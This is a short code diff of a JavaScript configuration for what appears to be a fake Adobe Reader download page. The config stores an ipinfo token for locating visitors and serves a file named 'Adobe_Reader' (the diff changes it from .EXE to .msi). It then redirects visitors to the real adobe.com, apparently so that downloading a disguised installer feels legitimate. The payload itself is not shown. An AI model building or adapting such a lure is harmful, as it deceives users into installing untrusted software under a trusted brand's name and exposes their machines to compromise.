@@ -32,8 +32,8 @@ window.config = {
     ipinfo_token: '1006035904ee8d',
 
     // Download Settings
-    downloadFile: "Adobe_Reader.EXE",
-    downloadName: "Adobe_Reader.EXE",
+    downloadFile: "Adobe_Reader.msi",
+    downloadName: "Adobe_Reader.msi",
 
     // Redirect URL
     redirectUrl: "https://www.adobe.com"
@@ -60,4 +60,5 @@ const ipinfo_token = window.config.ipinfo_token;
 const downloadFile = window.config.downloadFile;
 const downloadName = window.config.downloadName;
 const redirectUrl = window.config.redirectUrl;
+
 
